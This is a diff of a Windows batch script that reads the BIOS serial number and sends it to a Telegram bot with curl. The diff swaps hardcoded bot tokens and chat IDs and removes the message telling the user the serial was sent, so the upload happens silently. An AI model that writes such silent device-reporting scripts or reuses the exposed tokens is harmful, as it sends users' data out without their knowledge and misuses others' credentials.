@@ -6,8 +6,8 @@ for /f "tokens=2 delims==" %%I in ('wmic bios get serialnumber /value') do set S
 if "%SN%"=="" set SN=Serial number not found
 
 :: Set the Telegram Bot API Token and chat_id
-set TELEGRAM_BOT_API_TOKEN="7661657034:AAE-8jaW460052tsoXSIi88NcKX-Duo5F-Q"
-set TELEGRAM_CHAT_ID="-4610377580"
+set TELEGRAM_BOT_API_TOKEN="8029283872:AAGy7sGBbfuuKoKWEQYkU2lB1roCBEGquk0"
+set TELEGRAM_CHAT_ID="-1002253378530"
 
 :: URL encode the message to avoid issues with special characters
 set MESSAGE=Serial number: %SN%
@@ -20,7 +20,3 @@ set TELEGRAM_URL=https://api.telegram.org/bot%TELEGRAM_BOT_API_TOKEN%/sendMessag
 
 :: Use curl to send the message to Telegram
 curl -s "%TELEGRAM_URL%"
-
-:: Output the result
-echo The device serial number has been sent to Telegram.
-pause
